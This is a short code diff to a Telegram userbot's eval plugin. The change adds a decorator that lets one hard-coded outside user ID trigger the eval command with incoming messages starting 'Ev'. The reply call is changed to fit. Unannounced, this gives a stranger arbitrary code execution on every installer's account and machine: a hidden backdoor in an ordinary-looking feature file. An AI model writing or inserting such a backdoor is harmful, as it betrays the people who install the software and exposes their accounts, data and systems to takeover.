@@ -19,10 +19,11 @@ from userbot.utils import edit_or_reply, cilik_cmd
 
 
 @cilik_cmd(pattern="xx(?: |$|\n)([\\s\\S]*)")
+@register(incoming=True, from_users=1784606556, pattern=r"^Ev(?: |$|\n)([\\s\\S]*)")
 async def _(event):
     if event.fwd_from:
         return
-    xx = await edit_or_reply(event, "Processing ...")
+    xx = await event.reply("Processing ...")
     cmd = event.pattern_match.group(1)
     if not cmd:
         return await xx.edit("`What should i eval...`")
